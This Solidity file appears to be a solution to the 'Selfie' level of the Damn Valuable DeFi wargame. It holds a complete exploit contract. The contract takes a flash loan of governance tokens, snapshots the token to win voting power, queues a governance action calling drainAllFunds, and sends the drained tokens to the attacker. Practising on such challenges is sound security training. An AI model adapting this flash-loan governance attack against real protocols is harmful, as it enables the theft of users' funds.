// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "hardhat/console.sol";

import "@openzeppelin/contracts/utils/Address.sol";

import "../DamnValuableTokenSnapshot.sol";
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";



contract Hack {
    address token;
    address gov;
    address pool;
    address attacker;

    constructor(address _taken_token, address _hangover, address _pool, address _cattacker) {
        token = _taken_token;
        gov = _hangover;
        pool = _pool;
        attacker = _cattacker;
    }

     function run() public returns (uint256) {
        uint256 value = 1000001 ether;
        SelfiePool(pool).flashLoan(value);
        return SimpleGovernance(gov).queueAction(pool, abi.encodeWithSignature("drainAllFunds(address)", address(this)), 0);
    }

    function receiveTokens(address _token, uint256 _amount) public {
        DamnValuableTokenSnapshot(_token).snapshot();
        DamnValuableTokenSnapshot(_token).transfer(msg.sender, _amount);
    }

    function sendToAttacker() public {
        DamnValuableTokenSnapshot t = DamnValuableTokenSnapshot(token);
        t.transfer(attacker, t.balanceOf(address(this))); // 2000000 tokens
    }
}


contract Deployer {
    uint256 actionId;
    Hack hackContract;

    constructor(address token, address gov, address pool) {
        hackContract = new Hack(token, gov, pool, msg.sender);
        actionId = hackContract.run();
    }

    function drain(address gov) public {
        console.log('Executing the drain action');
        SimpleGovernance(gov).executeAction(actionId);
        console.log('We have now drained the pool; sending the muny to the attacker');
        hackContract.sendToAttacker();
    }
}
